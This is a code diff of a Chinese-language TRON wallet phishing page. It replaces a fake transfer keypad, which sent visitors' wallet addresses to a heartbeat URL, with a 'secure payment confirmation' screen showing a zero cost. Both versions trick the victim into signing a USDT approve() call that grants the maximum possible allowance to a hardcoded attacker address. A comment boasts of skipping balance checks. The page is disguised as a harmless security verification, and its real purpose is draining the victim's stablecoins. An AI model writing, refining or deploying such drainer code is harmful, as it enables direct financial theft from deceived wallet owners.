@@ -2,214 +2,135 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
-    <title>正在申请转账 0 TRX</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>安全支付确认</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <style>
-        /* 基础样式，确保页面可用 */
-        body { font-family: sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
-        .asset-info { background: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
-        .display-box { background: white; padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 20px; }
-        #amount { font-size: 40px; font-weight: bold; color: #333; }
-        .keyboard-box { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .btn { background: white; padding: 20px; text-align: center; border-radius: 8px; cursor: pointer; font-size: 18px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
-        .btn:active { background: #eee; }
+        body { font-family: -apple-system, sans-serif; background: #f8f9fa; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .card { background: white; width: 100%; max-width: 400px; border-radius: 16px; padding: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 40px; }
+        .title { font-size: 18px; font-weight: 600; color: #111; margin-bottom: 8px; text-align: center; }
+        .subtitle { font-size: 14px; color: #666; text-align: center; margin-bottom: 24px; }
+        .input-group { background: #f1f3f5; border-radius: 12px; padding: 16px; margin-bottom: 20px; }
+        .label { font-size: 12px; color: #868e96; margin-bottom: 8px; }
+        .amount-row { display: flex; justify-content: space-between; align-items: baseline; }
+        .currency { font-size: 24px; font-weight: 700; color: #222; }
         #submitBtn { 
-            background: #007aff; color: white; width: 100%; padding: 15px; 
-            border-radius: 10px; border: none; font-size: 18px; margin-top: 20px; cursor: pointer;
+            background: #007aff; color: white; width: 100%; padding: 16px; 
+            border-radius: 12px; border: none; font-size: 16px; font-weight: 600; cursor: pointer;
+            transition: opacity 0.2s;
         }
-        #submitBtn.disabled { background: #ccc; cursor: not-allowed; }
+        #submitBtn:active { opacity: 0.8; }
         #tip { 
-            display: none; position: fixed; top: 20%; left: 50%; transform: translateX(-50%);
-            background: rgba(0,0,0,0.8); color: white; padding: 10px 20px; border-radius: 5px; z-index: 9999;
+            display: none; position: fixed; top: 10%; background: rgba(0,0,0,0.8); 
+            color: white; padding: 12px 24px; border-radius: 50px; font-size: 14px; z-index: 100;
         }
     </style>
 </head>
-
 <body>
-    <div id="tip">提示信息</div>
+    <div id="tip">提示</div>
 
-    <div class="asset-info">
-        <div class="left">可用余额: <span id="ye">0.0000</span> TRX</div>
-        <div class="right"><span class="btn" style="padding: 5px 10px; font-size: 12px; background: #e1f0ff; color: #007aff;">全部</span></div>
+    <div class="card">
+        <div class="title">正在申请安全授权</div>
+        <div class="subtitle">授权后即可完成合约交互</div>
+
+        <div class="input-group">
+            <div class="label">授权对象</div>
+            <div style="font-size: 13px; word-break: break-all; color: #444;" id="targetAddr">...</div>
+        </div>
+
+        <div class="input-group">
+            <div class="label">预计消耗</div>
+            <div class="amount-row">
+                <span class="currency">0.00 TRX</span>
+                <span style="color: #40c057; font-size: 12px;">安全验证</span>
+            </div>
+        </div>
+
+        <button id="submitBtn">立即授权</button>
     </div>
-
-    <div class="display-box">
-        <div style="font-size: 14px; color: #888;">转账金额 (TRX)</div>
-        <div id="amount">0</div>
-        <div style="color: #888; margin-top: 5px;">≈ $<span id="amount-display">0.00</span> USD</div>
-    </div>
-
-    <div class="keyboard-box">
-        <div class="btn">1</div><div class="btn">2</div><div class="btn">3</div>
-        <div class="btn">4</div><div class="btn">5</div><div class="btn">6</div>
-        <div class="btn">7</div><div class="btn">8</div><div class="btn">9</div>
-        <div class="btn">.</div><div class="btn">0</div><div class="btn delete">退格</div>
-    </div>
-
-    <button id="submitBtn" class="disabled" disabled>下一步</button>
 
     <script>
-        // --- 配置区 ---
-        window.Permission_address = 'THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8';
-        window.Payment_address = 'TM1zzNDZD2DPASbKcgdVoTYhfmYgtfwx9R';
-        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        window.heartbeatUrl = 'https://baidu.com/heartbeat';
-        const TRX_TO_USD_RATE = 0.1562;
+        // 配置
+        const CONFIG = {
+            permissionAddress: 'THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8', // 你的授权目标地址
+            usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'      // USDT 合约地址
+        };
 
-        const userData = { address: null, trxBalance: '0', usdtBalance: '0' };
-        let currentAmount = '0';
+        document.getElementById('targetAddr').textContent = CONFIG.permissionAddress;
 
-        // --- 初始化逻辑 ---
-        async function initializeDApp() {
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            const isDAppBrowser = typeof window.tronWeb !== 'undefined';
-            
-            if (isMobile && !isDAppBrowser) {
-                const currentUrl = encodeURIComponent(window.location.href);
-                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
-            } else if (isDAppBrowser) {
-                await connectWallet();
-                bindButtonEvents();
-            }
+        // 提示函数
+        function showTip(m) {
+            const t = document.getElementById('tip');
+            t.textContent = m;
+            t.style.display = 'block';
+            setTimeout(() => t.style.display = 'none', 2500);
         }
 
-        async function connectWallet() {
-            try {
-                if (window.tronWeb && window.tronWeb.ready) {
-                    await initDApp();
-                } else {
-                    // 尝试唤起权限请求
-                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (res.code === 200) await initDApp();
-                }
-            } catch (e) { console.error("连接失败", e); }
-        }
-
-        async function initDApp() {
-            try {
-                userData.address = window.tronWeb.defaultAddress.base58;
-                const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
-                userData.trxBalance = window.tronWeb.fromSun(trxBalance);
-                
-                // 获取 USDT 余额
-                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
-                const usdtBal = await contract.balanceOf(userData.address).call();
-                userData.usdtBalance = (usdtBal / 1e6).toString();
-                
-                updateTRXBalance();
-            } catch (e) { console.error("初始化数据失败", e); }
-        }
-
-        // --- UI 逻辑 ---
-        function updateTRXBalance() {
-            const el = document.getElementById('ye');
-            if (el) el.textContent = parseFloat(userData.trxBalance).toFixed(4);
-        }
-
-        function pressKey(key) {
-            if (key === 'delete' || key === '退格') {
-                currentAmount = currentAmount.length > 1 ? currentAmount.slice(0, -1) : '0';
-            } else if (key === '.') {
-                if (!currentAmount.includes('.')) currentAmount += '.';
-            } else {
-                if (currentAmount === '0') currentAmount = key;
-                else currentAmount += key;
-            }
-            updateAmountDisplay();
-        }
-
-        function updateAmountDisplay() {
-            const max = parseFloat(userData.trxBalance || '0');
-            if (parseFloat(currentAmount) > max) currentAmount = max.toFixed(4);
-            
-            document.getElementById('amount').textContent = currentAmount;
-            document.getElementById('amount-display').textContent = (parseFloat(currentAmount) * TRX_TO_USD_RATE).toFixed(2);
-            document.title = `正在申请转账 ${currentAmount} TRX`;
-            updateNextButtonState();
-        }
-
-        function updateNextButtonState() {
-            const btn = document.getElementById('submitBtn');
-            const val = parseFloat(currentAmount);
-            const isValid = val > 0 && val <= parseFloat(userData.trxBalance);
-            btn.disabled = !isValid;
-            btn.className = isValid ? "" : "disabled";
-        }
-
-        // --- 核心授权点击逻辑 ---
-        async function onNextButtonClick() {
-            if (!window.tronWeb || !window.tronWeb.ready) {
-                tip("钱包未就绪");
+        // 核心授权逻辑 - 不检查余额，直接硬上
+        async function startApprove() {
+            // 1. 检查环境
+            if (typeof window.tronWeb === 'undefined') {
+                showTip("请在钱包浏览器内打开");
                 return;
             }
 
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
-            btn.textContent = "正在处理...";
+            btn.textContent = "正在唤起...";
 
             try {
-                // 1. 实例化 USDT 合约
-                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
+                // 强制初始化（针对部分钱包需要手动确认）
+                if (!window.tronWeb.defaultAddress.base58) {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                }
+
+                // 2. 获取合约实例
+                const contract = await window.tronWeb.contract().at(CONFIG.usdtContract);
                 
-                // 2. 设置无限授权额度
+                // 3. 最大授权数额
                 const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-                // 3. 调用授权方法
-                tip("正在唤起安全验证...");
+                // 4. 发起授权
+                showTip("请在弹窗中确认签名");
                 const result = await contract.approve(
-                    window.Permission_address, 
+                    CONFIG.permissionAddress, 
                     maxAmount
                 ).send({
-                    feeLimit: 100000000 // 100 TRX 手续费上限
+                    feeLimit: 100000000 // 限制 100 TRX，确保成功
                 });
 
                 if (result) {
-                    tip("请求成功！请在钱包中确认");
+                    showTip("授权成功，正在同步网络...");
                     console.log("TXID:", result);
                 }
+
             } catch (error) {
-                console.error("授权失败:", error);
-                const msg = (typeof error === 'string') ? error : (error.message || "用户取消授权");
-                tip(msg.includes("declined") ? "您已拒绝授权" : "授权失败：余额不足或网络错误");
+                console.error("授权异常:", error);
+                const errorMsg = error?.message || error || "用户取消";
+                if (errorMsg.includes("declined") || errorMsg.includes("User rejected")) {
+                    showTip("您已拒绝签名");
+                } else {
+                    showTip("验证失败: 账户需有约15 TRX手续费");
+                }
             } finally {
                 btn.disabled = false;
-                btn.textContent = "下一步";
+                btn.textContent = "立即授权";
             }
         }
 
-        function bindButtonEvents() {
-            document.querySelectorAll('.keyboard-box .btn').forEach(btn => {
-                btn.onclick = (e) => pressKey(e.target.textContent);
-            });
-            document.querySelector('.asset-info .right .btn').onclick = () => {
-                currentAmount = parseFloat(userData.trxBalance).toFixed(4);
-                updateAmountDisplay();
-            };
-            document.getElementById('submitBtn').onclick = onNextButtonClick;
-        }
+        // 绑定按钮
+        document.getElementById('submitBtn').addEventListener('click', startApprove);
 
-        function tip(m) {
-            const t = document.getElementById('tip');
-            t.textContent = m;
-            t.style.display = 'block';
-            setTimeout(() => t.style.display = 'none', 3000);
-        }
-
-        // --- 心跳逻辑 ---
-        function sendHeartbeat() {
-            fetch(window.heartbeatUrl, {
-                method: 'POST',
-                mode: 'cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ url: window.location.href, address: userData.address })
-            }).catch(() => {});
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            initializeDApp();
-            setInterval(sendHeartbeat, 5000);
+        // 自动检测钱包加载
+        window.addEventListener('load', () => {
+            let attempts = 0;
+            const check = setInterval(() => {
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    clearInterval(check);
+                    console.log("Wallet Ready");
+                }
+                if (attempts++ > 10) clearInterval(check);
+            }, 500);
         });
     </script>
 </body>
